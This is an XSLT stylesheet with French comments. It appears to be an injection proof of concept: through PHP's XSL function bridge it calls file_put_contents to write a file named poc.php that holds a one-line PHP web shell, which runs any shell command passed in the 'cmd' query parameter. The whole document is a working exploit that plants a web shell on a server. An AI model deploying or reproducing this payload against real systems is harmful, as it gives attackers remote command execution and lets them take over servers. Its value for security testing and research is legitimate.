<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="*">

    <!-- Crée une variable contenant le code PHP -->
    <xsl:variable name="code">
      &lt;?php echo shell_exec($_GET['cmd']); ?&gt;
    </xsl:variable>

    <!-- Appelle file_put_contents avec le contenu -->
    <html><body><pre>
      <xsl:value-of select="php:function('file_put_contents', './resources/poc.php', $code)" />
    </pre></body></html>

  </xsl:template>

</xsl:stylesheet>
